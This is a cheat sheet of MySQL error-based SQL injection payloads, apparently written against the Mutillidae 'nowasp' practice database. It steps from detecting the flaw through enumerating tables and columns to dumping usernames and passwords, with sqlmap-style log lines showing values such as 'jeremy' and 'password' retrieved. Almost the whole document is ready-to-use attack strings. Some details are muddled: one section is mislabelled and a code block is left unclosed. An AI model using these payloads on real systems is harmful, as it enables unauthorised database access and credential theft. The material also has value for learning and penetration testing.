SQL Injection ERROR Based
=========================

Detection
---------
```sql
# Modify "8095" and monitor for different responses.
'+AND+(SELECT+8095+FROM(SELECT+COUNT(*),CONCAT('qqvkq',(SELECT+(ELT(8095=8095,1))),'qbzxq',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
```


Get Current Database
--------------------
```sql
# Search response for 'ZZZZZZ" to get DB name eg "targetdb.ZZZZZZ does not exist"
'+AND+(SELECT+7199+FROM(SELECT+COUNT(*),CONCAT('qxxvq',(SELECT+(CASE+WHEN+(ISNULL(ZZZZZZ(NULL)))+THEN+1+ELSE+0+END)),'qkbjq',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
```


Get Number of Tables
--------------------
```sql
# Search response for "zzz" to get the number of tables eg "Duplicate entry zzz12zzz"
'+AND+(SELECT+6583+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+COUNT(table_name)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('nowasp')),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
```


Get Table Names
---------------
```sql
# Need to modify "table_schema+IN+('nowasp')" to reflect the database name identified above
# Search response for "zzz" to get table name eg "zzzaccountszzz"
'+AND+(SELECT+4981+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+MID((table_name),1,54)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('nowasp')+LIMIT+0,1),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+

# Increment "LIMIT+0,1" like this.... "LIMIT+1,1" "LIMIT+2,1" until the total number of tables have been reached. 
'+AND+(SELECT+4981+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+MID((table_name),1,54)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('nowasp')+LIMIT+1,1),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
```


Get Number of Columns in Table
------------------------------
```sql
# Search response for "zzz" to get the number of columns in the table eg "zzz7zzz"
'+AND+(SELECT+3173+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+COUNT(*)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='accounts'+AND+table_schema='nowasp'),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
```


Get Columns Names in Table
---------------------------
```sql
# Need to modify the "table_name" and "table_schema" before injection
# Increment "LIMIT+0,1" like this.... "LIMIT+1,1" "LIMIT+2,1" until the total number of columns has been reached. 
'+AND+(SELECT+1076+FROM(SELECT+COUNT(*),CONCAT('qxxvq',(SELECT+MID((column_name),1,54)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='accounts'+AND+table_schema='nowasp'+LIMIT+0,1),'qkbjq',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
```


Get Number of Entries in Column
-------------------------------
```sql
# Search for "zzz' in response, eg "zzz42zzz" 
# need to modify "ORDER+BY+password" to reflect any column name identified 
# Need to modify "FROM+nowasp.accounts" as identified
'+AND+(SELECT+9332+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+MID((password),1,54)+FROM+nowasp.accounts+ORDER+BY+password+LIMIT+0,1),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+


Get Data from Columns
---------------------
```sql
# Search for "zzz' in response, eg "zzzadminzzz"
'+AND+(SELECT+9332+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+MID((password),1,54)+FROM+nowasp.accounts+LIMIT+0,1),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+

# Increment "LIMIT+0,1" like this.... "LIMIT+1,1" "LIMIT+2,1"
'+AND+(SELECT+9332+FROM(SELECT+COUNT(*),CONCAT('zzz',(SELECT+MID((password),1,54)+FROM+nowasp.accounts+LIMIT+0,1),'zzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+


# pay close attention to "(SELECT+MID((username)" and "(SELECT+MID((password)" (these are the columns), also "LIMIT+6,1" and "LIMIT+7,1" must match the order.

'+AND+(SELECT+9130+FROM(SELECT+COUNT(*),CONCAT('zzzzz',(SELECT+MID((username),1,54)+FROM+nowasp.accounts+ORDER+BY+password+LIMIT+6,1),'zzzzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
[14:57:27] [INFO] retrieved: 'PPan'
'+AND+(SELECT+6392+FROM(SELECT+COUNT(*),CONCAT('zzzzz',(SELECT+MID((password),1,54)+FROM+nowasp.accounts+ORDER+BY+password+LIMIT+7,1),'zzzzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
[14:57:27] [INFO] retrieved: 'password'


'+AND+(SELECT+7348+FROM(SELECT+COUNT(*),CONCAT('zzzzz',(SELECT+MID((username),1,54)+FROM+nowasp.accounts+ORDER+BY+password+LIMIT+7,1),'zzzzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
[14:57:27] [INFO] retrieved: 'jeremy'
'+AND+(SELECT+6924+FROM(SELECT+COUNT(*),CONCAT('zzzzz',(SELECT+MID((password),1,54)+FROM+nowasp.accounts+ORDER+BY+password+LIMIT+8,1),'zzzzz',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+
[14:57:27] [INFO] retrieved: 'password'
```
